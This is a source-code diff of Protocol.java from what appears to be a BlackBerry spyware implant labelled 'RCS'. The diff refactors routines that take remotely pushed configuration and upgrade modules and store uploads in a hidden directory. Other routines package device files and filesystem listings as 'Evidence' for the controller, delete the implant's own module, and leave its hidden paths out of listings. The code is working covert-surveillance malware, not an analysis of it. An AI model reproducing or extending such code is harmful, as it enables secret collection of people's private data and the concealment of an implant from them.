@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync;
 
 import java.util.Date;
@@ -20,8 +20,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
-import blackberry.config.Conf;
-import blackberry.crypto.Encryption;
+import blackberry.config.Cfg;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -44,8 +43,8 @@ public abstract class Protocol {
 
     protected Transport transport;
 
-    public boolean reload;
-    public boolean uninstall;
+    //public boolean reload;
+    //public boolean uninstall;
 
     public boolean init(Transport transport) {
         this.transport = transport;
@@ -57,28 +56,55 @@ public abstract class Protocol {
 
     public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFile file = new AutoFile(Path.USER()
-                + Path.CONF_DIR + Conf.NEW_CONF, true);
 
-        file.create();
-        final boolean ret = file.write(conf, offset, conf.length - offset);
-        if (!ret) {
+        boolean ret = false;
+        try {
             //#ifdef DEBUG
-            debug.error("saveNewConf: cannot write on file: "
-                    + file.getFullFilename());
+            debug.trace("saveNewConf opening");
             //#endif
-            
-            throw new CommandException(); //"write"
-        }else{
-            Evidence.info("New configuration received");
+            final AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
+
+            //#ifdef DEBUG
+            debug.trace("saveNewConf exists");
+            //#endif
+            if (file.exists()) {
+                //#ifdef DEBUG
+                debug.trace("saveNewConf delete");
+                //#endif
+                file.delete();
+            }
+
+            //#ifdef DEBUG
+            debug.trace("saveNewConf create");
+            //#endif
+            file.create();
+
+            //#ifdef DEBUG
+            debug.trace("saveNewConf write");
+            //#endif
+            ret = file.write(conf, offset, conf.length - offset);
+            if (!ret) {
+                //#ifdef DEBUG
+                debug.error("saveNewConf: cannot write on file: "
+                        + file.getFullFilename());
+                //#endif
+
+                throw new CommandException(); //"write"
+            } else {
+                Evidence.info("New configuration received");
+            }
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("saveNewConf");
+            //#endif
         }
 
         return ret;
     }
 
     public static void saveUpload(String filename, byte[] content) {
-        final AutoFile file = new AutoFile(Path.USER() + filename,
-                true);
+        final AutoFile file = new AutoFile(Path.hidden(), filename);
 
         if (file.exists()) {
             //#ifdef DEBUG
@@ -150,10 +176,10 @@ public abstract class Protocol {
     }
 
     public static boolean upgradeMulti() {
-        final AutoFile file_0 = new AutoFile(Path.USER()
-                + Protocol.UPGRADE_FILENAME_0, true);
-        final AutoFile file_1 = new AutoFile(Path.USER()
-                + Protocol.UPGRADE_FILENAME_1, true);
+        final AutoFile file_0 = new AutoFile(Path.hidden(),
+                Protocol.UPGRADE_FILENAME_0);
+        final AutoFile file_1 = new AutoFile(Path.hidden(),
+                Protocol.UPGRADE_FILENAME_1);
 
         if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
@@ -198,7 +224,7 @@ public abstract class Protocol {
 
     public static boolean deleteSelf() {
         // Delete it self.
-        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
+        final int handle = CodeModuleManager.getModuleHandle(Cfg.MODULE_NAME);
         if (handle != 0) {
             final int success = CodeModuleManager.deleteModuleEx(handle, true);
             //#ifdef DEBUG
@@ -317,11 +343,9 @@ public abstract class Protocol {
 
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
-        Evidence log = new Evidence(false, Encryption.getKeys().getAesKey());
+        Evidence log = new Evidence(EvidenceType.DOWNLOAD);
 
-        log.createEvidence(additional, EvidenceType.DOWNLOAD);
-        log.writeEvidence(content);
-        log.close();
+        log.atomicWriteOnce(additional, content);
     }
 
     private static byte[] logDownloadAdditional(String filename) {
@@ -332,7 +356,7 @@ public abstract class Protocol {
         Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
         //#endif
 
-        String path = Utils.chomp(Path.USER(), "/"); // UPLOAD_DIR
+        String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
         int macroPos = filename.indexOf(path);
         if (macroPos >= 0) {
             //#ifdef DEBUG
@@ -363,8 +387,8 @@ public abstract class Protocol {
     }
 
     public static void saveFilesystem(int depth, String path) {
-        Evidence fsLog = new Evidence(false, Encryption.getKeys().getAesKey());
-        fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
+        Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
+        fsLog.createEvidence();
 
         // Expand path and create log
         if (path.equals("/")) {
@@ -529,8 +553,7 @@ public abstract class Protocol {
                 //#endif
             }
 
-            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
-                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
+            if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
                 //#ifdef DEBUG
                 debug.warn("expandPath ignoring hidden path: " + dPath);
                 //#endif
